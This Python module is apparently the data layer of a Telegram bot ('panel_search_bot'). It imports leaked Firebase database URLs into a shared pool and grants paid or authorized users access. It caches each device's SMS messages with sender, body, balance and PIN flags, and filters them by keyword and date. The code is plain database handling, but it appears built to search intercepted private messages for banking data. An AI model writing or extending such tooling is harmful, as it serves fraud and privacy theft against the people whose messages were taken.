from __future__ import annotations

from datetime import datetime, timedelta
from pathlib import Path

from sqlalchemy.orm import Session

from panel_search_bot.config import get_settings
from panel_search_bot.firebase_urls import extract_firebase_urls, normalize_firebase_url
from panel_search_bot.models import BotUser, CachedSms, FirebaseDb


def get_or_create_user(db: Session, telegram_id: int, username: str | None = None) -> BotUser:
    user = db.query(BotUser).filter(BotUser.telegram_id == telegram_id).first()
    if user:
        if username and user.username != username:
            user.username = username
        return user
    user = BotUser(telegram_id=telegram_id, username=username)
    db.add(user)
    db.commit()
    db.refresh(user)
    return user


def is_allowed(user: BotUser, owner_ids: set[int]) -> bool:
    if user.telegram_id in owner_ids:
        return True
    return user.authorized or user.premium


def authorize_user(db: Session, telegram_id: int, premium: bool = True) -> BotUser:
    user = get_or_create_user(db, telegram_id)
    user.authorized = True
    user.premium = premium
    db.commit()
    db.refresh(user)
    return user


def add_firebase_urls(
    db: Session,
    urls: list[str],
    *,
    pool: str,
    owner_telegram_id: int | None,
) -> tuple[int, int]:
    added = 0
    skipped = 0
    for raw in urls:
        try:
            norm = normalize_firebase_url(raw)
        except ValueError:
            skipped += 1
            continue
        existing = db.query(FirebaseDb).filter(FirebaseDb.url_normalized == norm).first()
        if existing:
            if pool == "personal" and owner_telegram_id and existing.owner_telegram_id != owner_telegram_id:
                existing.owner_telegram_id = owner_telegram_id
                existing.pool = "personal"
            skipped += 1
            continue
        db.add(
            FirebaseDb(
                url_normalized=norm,
                url_original=raw,
                pool=pool,
                owner_telegram_id=owner_telegram_id,
            )
        )
        added += 1
    db.commit()
    return added, skipped


def import_leak_file(db: Session, path: str) -> tuple[int, int]:
    file_path = Path(path)
    if not file_path.exists():
        return 0, 0
    text = file_path.read_text(encoding="utf-8", errors="ignore")
    urls = extract_firebase_urls(text)
    return add_firebase_urls(db, urls, pool="leak", owner_telegram_id=None)


def list_search_urls(db: Session, telegram_id: int, owner_ids: set[int]) -> list[FirebaseDb]:
    personal = db.query(FirebaseDb).filter(FirebaseDb.owner_telegram_id == telegram_id).all()
    leaks = db.query(FirebaseDb).filter(FirebaseDb.pool == "leak").all()
    if telegram_id in owner_ids:
        all_rows = db.query(FirebaseDb).all()
        seen = {row.url_normalized for row in all_rows}
        merged = list(all_rows)
        for row in personal + leaks:
            if row.url_normalized not in seen:
                merged.append(row)
        return merged
    by_url = {row.url_normalized: row for row in leaks}
    for row in personal:
        by_url[row.url_normalized] = row
    return list(by_url.values())


def count_personal_dbs(db: Session, telegram_id: int) -> int:
    return db.query(FirebaseDb).filter(FirebaseDb.owner_telegram_id == telegram_id).count()


def upsert_cached_sms(db: Session, firebase_db_id: int, device_key: str, rows: list[dict]) -> None:
    db.query(CachedSms).filter(CachedSms.firebase_db_id == firebase_db_id).delete()
    for row in rows:
        db.add(
            CachedSms(
                firebase_db_id=firebase_db_id,
                device_key=device_key[:256],
                sender=str(row.get("sender", ""))[:128],
                body=str(row.get("body", "")),
                message_at=row.get("message_at"),
                balance_value=row.get("balance"),
                has_pin=bool(row.get("has_pin")),
                raw_path=str(row.get("raw_path", ""))[:512],
                fetched_at=datetime.utcnow(),
            )
        )
    db.commit()


def load_cached_sms(db: Session, firebase_db_ids: list[int]) -> list[CachedSms]:
    if not firebase_db_ids:
        return []
    return db.query(CachedSms).filter(CachedSms.firebase_db_id.in_(firebase_db_ids)).all()


def update_firebase_status(db: Session, fb_id: int, online: bool) -> None:
    row = db.query(FirebaseDb).filter(FirebaseDb.id == fb_id).first()
    if row:
        row.is_online = online
        row.last_checked_at = datetime.utcnow()
        db.commit()


def match_keywords(text: str, keywords: list[str]) -> bool:
    lower = text.lower()
    for kw in keywords:
        cleaned = kw.strip().lower()
        if not cleaned:
            continue
        if cleaned.startswith("\\"):
            cleaned = cleaned[1:]
        if cleaned not in lower:
            return False
    return True


def within_days(message_at: datetime | None, days: int | None) -> bool:
    if days is None:
        return True
    if message_at is None:
        return False
    cutoff = datetime.utcnow() - timedelta(days=days)
    return message_at >= cutoff
